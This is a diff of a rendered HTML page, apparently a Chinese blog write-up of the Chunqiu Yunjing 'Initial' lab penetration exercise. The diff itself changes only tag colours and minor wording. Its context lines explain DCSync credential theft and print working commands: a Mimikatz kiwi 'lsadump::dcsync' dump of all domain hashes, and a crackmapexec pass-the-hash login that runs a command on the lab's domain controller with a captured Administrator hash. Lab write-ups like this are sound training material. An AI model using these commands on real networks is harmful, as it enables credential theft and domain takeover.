@@ -345,12 +345,12 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/CVE/" style="color: #03a9f4">CVE</a>
+                <a href="/blog/tags/CVE/" style="color: #00bcd4">CVE</a>
             </span>
             
             <span class="tag">
                 
-                <a href="/blog/tags/ThinkPHP/" style="color: #03a9f4">ThinkPHP</a>
+                <a href="/blog/tags/ThinkPHP/" style="color: #00bcd4">ThinkPHP</a>
             </span>
             
             <span class="tag">
@@ -590,7 +590,7 @@ exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
 <p><strong>DCSync攻击:</strong><br>DCSync的原理是利用域控制器之间的数据同步复制<br>DCSync是AD域渗透中常用的凭据窃取手段，默认情况下，域内不同DC每隔15分钟会进行一次数据同步，当一个DC从另外一个DC同步数据时，发起请求的一方会通过目录复制协议（MS-DRSR）来对另外一台域控中的域用户密码进行复制，DCSync就是利用这个原理，“模拟”DC向真实DC发送数据同步请求，获取用户凭据数据，由于这种攻击利用了Windows RPC协议，并不需要登陆域控或者在域控上落地文件，避免触发EDR告警，因此DCSync时一种非常隐蔽的凭据窃取方式</p>
 </blockquote>
 <blockquote>
-<p><strong>DCSync 攻击前提:</strong><br>想进行 DCSync 攻击，必须获得以下任一用户的权限：<br>Administrators 组内的用户<br>Domain Admins 组内的用户<br>Enterprise Admins 组内的用户域控制器的计算机帐户<br>即：默认情况下域管理员组具有该权限</p>
+<p><strong>DCSync 攻击前提:</strong><br>想进行 DCSync 攻击，必须获得以下任一用户的权限：<br>Administrators 组内的用户<br>Domain Admins 组内的用户<br>Enterprise Admins 组内的用户域控制器的计算机帐户<br>默认情况下域管理员组具有该权限</p>
 </blockquote>
 <p>这里我们用永恒之蓝打完本来就是 system 权限，然后我们<code>load kiwi</code>启用猕猴桃，抓取用户的hash</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">load kiwi
@@ -599,7 +599,7 @@ kiwi_cmd <span class="token string">"lsadump::dcsync /domain:xiaorang.lab /all /
 
 <p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224125323059.png" alt="image-20250224125323059"></p>
 <p>抓到了 Administrator 的 hash</p>
-<h1 id="DC01-172-22-1-2"><a href="#DC01-172-22-1-2" class="headerlink" title="DC01 - 172.22.1.2"></a>DC01 - 172.22.1.2</h1><h2 id="smb-登录域内主机"><a href="#smb-登录域内主机" class="headerlink" title="smb 登录域内主机"></a>smb 登录域内主机</h2><p>之前扫出来 .2 的 445 端口开放，利用 smb 哈希传递，直接用 kali 自带的 crackmapexec，参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42077227/article/details/130279040">https://blog.csdn.net/qq_42077227/article/details/130279040</a></p>
+<h1 id="DC01-172-22-1-2"><a href="#DC01-172-22-1-2" class="headerlink" title="DC01 - 172.22.1.2"></a>DC01 - 172.22.1.2</h1><h2 id="smb-登录域内主机"><a href="#smb-登录域内主机" class="headerlink" title="smb 登录域内主机"></a>smb 登录域内主机</h2><p>之前扫出来 .2 的 445 端口开放，利用 smb 哈希传递，直接用 kali 自带的 crackmapexec，参考： <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42077227/article/details/130279040">https://blog.csdn.net/qq_42077227/article/details/130279040</a></p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains4 crackmapexec smb <span class="token number">172.22</span>.1.2 <span class="token parameter variable">-u</span> administrator <span class="token parameter variable">-H10cf89a850fb1cdbe6bb432b859164c8</span> <span class="token parameter variable">-d</span> xiaorang.lab <span class="token parameter variable">-x</span> <span class="token string">"type Users\Administrator<span class="token entity" title="\f">\f</span>lag<span class="token entity" title="\f">\f</span>lag03.txt"</span>
 <span class="token comment"># -d指定域登录，-x要执行的命令</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
